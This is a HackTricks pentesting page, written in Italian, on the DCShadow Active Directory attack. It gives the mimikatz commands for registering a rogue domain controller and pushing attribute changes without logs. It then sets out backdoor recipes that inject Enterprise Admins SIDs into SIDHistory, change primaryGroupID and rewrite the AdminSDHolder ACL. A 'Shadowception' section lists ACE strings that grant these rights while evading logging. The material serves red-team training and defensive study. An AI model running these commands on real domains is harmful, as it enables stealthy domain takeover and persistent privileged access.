{{#include ../../banners/hacktricks-training.md}}

# DCShadow

Registra un **nuovo Domain Controller** nell'AD e lo utilizza per **inviare attributi** (SIDHistory, SPNs...) su oggetti specificati **senza** lasciare alcun **log** riguardo le **modifiche**. Hai **bisogno di privilegi DA** e devi essere all'interno del **dominio radice**.\
Nota che se utilizzi dati errati, appariranno log piuttosto brutti.

Per eseguire l'attacco hai bisogno di 2 istanze di mimikatz. Una di esse avvierà i server RPC con privilegi SYSTEM (devi indicare qui le modifiche che desideri eseguire), e l'altra istanza sarà utilizzata per inviare i valori:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Nota che **`elevate::token`** non funzionerà nella sessione `mimikatz1` poiché ha elevato i privilegi del thread, ma dobbiamo elevare il **privilegio del processo**.\
Puoi anche selezionare un oggetto "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Puoi applicare le modifiche da un DA o da un utente con questi permessi minimi:

- Nell'**oggetto di dominio**:
- _DS-Install-Replica_ (Aggiungi/Rimuovi Replica nel Dominio)
- _DS-Replication-Manage-Topology_ (Gestisci Topologia di Replica)
- _DS-Replication-Synchronize_ (Sincronizzazione Replica)
- L'**oggetto Siti** (e i suoi figli) nel **contenitore di Configurazione**:
- _CreateChild e DeleteChild_
- L'oggetto del **computer registrato come DC**:
- _WriteProperty_ (Non Write)
- L'**oggetto target**:
- _WriteProperty_ (Non Write)

Puoi usare [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) per dare questi privilegi a un utente non privilegiato (nota che questo lascerà alcuni log). Questo è molto più restrittivo rispetto ad avere privilegi DA.\
Ad esempio: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Questo significa che il nome utente _**student1**_ quando è connesso nella macchina _**mcorp-student1**_ ha permessi DCShadow sull'oggetto _**root1user**_.

## Utilizzare DCShadow per creare backdoor
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
## Shadowception - Dare permessi DCShadow usando DCShadow (senza log di permessi modificati)

Dobbiamo aggiungere i seguenti ACE con il SID del nostro utente alla fine:

- Sull'oggetto dominio:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Sull'oggetto computer dell'attaccante: `(A;;WP;;;UserSID)`
- Sull'oggetto utente target: `(A;;WP;;;UserSID)`
- Sull'oggetto Siti nel contenitore di Configurazione: `(A;CI;CCDC;;;UserSID)`

Per ottenere l'attuale ACE di un oggetto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Nota che in questo caso devi fare **diverse modifiche,** non solo una. Quindi, nella **sessione mimikatz1** (server RPC) usa il parametro **`/stack` con ogni modifica** che vuoi fare. In questo modo, dovrai solo **`/push`** una volta per eseguire tutte le modifiche accumulate nel server rogue.

[**Ulteriori informazioni su DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
